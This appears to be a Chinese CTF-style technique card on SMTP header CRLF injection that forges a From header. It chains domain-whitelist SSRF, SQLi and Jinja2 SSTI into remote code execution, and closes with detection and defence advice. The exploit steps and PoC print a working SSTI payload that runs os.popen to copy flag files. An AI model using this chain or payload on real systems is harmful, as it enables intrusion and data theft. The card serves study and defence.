---
id: web-generic-crlf-smtp-header-injection-forged-from
title: '反馈接口邮件 Subject 头 CRLF 注入伪造 From: admin，配合发件人过滤与域名白名单 SSRF、SQLi 回显 SSTI 打通 RCE'
type: scenario
domain: web
path: web/generic/crlf
technique: smtp-header-injection-forged-from
aliases:
- SMTP 头注入
- 邮件头 CRLF 注入
- 伪造 From 发件人
- Subject 换行注入
- report 邮件伪造
tags:
- web
- crlf
- smtp
- email
- header-injection
- ssrf
- sqli
- ssti
- bot
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

## 一句话结论

反馈/举报接口把用户输入直接拼进 SMTP 报文头（如 `Subject: {url}`），攻击者用 `\r\n` 在报文中注入 `From: admin@ezmail.org` 等头字段伪造发件人，使只信任 `FROM "admin@ezmail.org"` 的内部流程（管理员邮箱机器人）取走攻击者指定的 URL；当该 URL 指向同域下存在 SQLi 的页面时，页面回显内容可进一步注入 SSTI，在管理端 `render_template_string` 处形成 RCE。

## 原理

- **SMTP 报文与 HTTP 不同，头与体之间就是裸的 CRLF 分隔**：`smtplib.sendmail` 只做最小的行规范化，若应用把用户输入直接放进模板字符串 `From: ...\r\nSubject: {url}\r\n\r\n{content}\r\n.\r\n`，输入中的 `\r\n` 会提前结束 Subject 头并让后续内容成为新头或新正文；本题还重写了 `smtplib._quote_periods` 去除对行首 `.` 的引用，`format` 又发生在 `_fix_eols` 之后，双重放大注入面。
- **发件人过滤被伪造头绕过**：收件侧机器人用 `mail.search(None, 'FROM "admin@ezmail.org"')` 只取 admin 发来的最新邮件，而 `From:` 头完全由发送方报文决定，注入 `From: admin@ezmail.org` 即冒充；
- **域名白名单 SSRF 的残留面**：`fetch_page_content` 校验 `scheme == http 且 hostname == ezmail.org`，但校验的只是字符串主机名，同域下带 SQLi 的 `/news` 页面仍在白名单内；
- **回显型注入链**：`/news?id=` 用 f-string 拼 SQL，union select 可控制页面标题的返回内容；管理端把取回的 `page_content` 放进 `render_template_string` 渲染，标题内容即被当作 Jinja2 模板执行，union 出 SSTI payload 即 RCE；
- 管理端仅允许 `127.0.0.1` 访问，攻击者借 `/bot`（服务端自请求 /admin 的机器人）触发整条链。

## 触发条件

1. 存在把用户输入拼进 SMTP 报文头（Subject/To/X-Mailer 等）的邮件发送功能且未过滤 CRLF；
2. 某个内部流程只根据 `From:` 头等可伪造字段决定信任级别，并会处理邮件内容中的 URL；
3. 该 URL 落在某个域名校验白名单内，且同域存在可控制页面内容的注入点（SQLi/存储内容）；
4. 页面内容最终进入服务端模板渲染（render_template_string 等）。

## 利用步骤

1. 构造 Subject 注入 payload：`http://ezmail.org:3000/news?id=-1 union select '{{ SSTI }}'\r\nFrom: admin@ezmail.org`；
2. 通过 /report 提交，使邮件报文 Subject 为上述 URL 且多出一个 `From: admin@ezmail.org` 头；
3. 触发管理机器人（/bot 自请求 /admin）：管理端从 IMAP 取"admin 发来的"最新邮件，得到该 URL；
4. `fetch_page_content` 校验 hostname 为 ezmail.org 放行，请求落到带 SQLi 的 /news 页面；
5. union select 使页面返回 SSTI payload（如写入静态目录：`{{ ...__import__('os').popen('mkdir static;cat /f*>>static/1').read() }}`）；
6. 管理端 `render_template_string(page_content)` 渲染执行，RCE 落盘；用 sleep 差异或直接访问静态文件确认。

## PoC

```
url = ("http://ezmail.org:3000/news?id=-1 "
       "union select '{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"mkdir static;cat /f*>>static/1;sleep 10\").read() }}'\r\n"
       "From: admin@ezmail.org\r\n")
POST /report  data={url: url, content: "x"}
GET /bot      # 触发；响应延迟约 10s 说明 RCE 成功
GET /static/1 # 取回 flag
```

## 变体与关联

- 邮件头注入也可伪造 `To`/`Bcc` 实现垃圾邮件群发或绕过收件人限制；
- 与 HTTP 响应头 CRLF 注入同源（见同库 Nginx Location CRLF 卡），但 SMTP 报文头注入往往没有 WAF/框架层防护；
- 末端 SSTI 也可换成 XSS：管理端机器人把页面内容渲染进 innerHTML/模板时执行，窃取管理员会话。

## 检测与防御

- 检测：审计所有拼接进邮件头/SMTP 报文的用户输入，fuzz `%0d%0a` 与 `\r\n`；
- 防御：对进入邮件头的输入剥离或编码 CRLF（Python 3 的 `email.message.EmailMessage` 会拒绝含换行的头值）；发件人信任不要基于可伪造的 `From:` 头，改用 SPF/DKIM 校验或专用内部通道；模板渲染前对远端内容做白名单处理，禁止把抓取的页面内容传给 `render_template_string`。
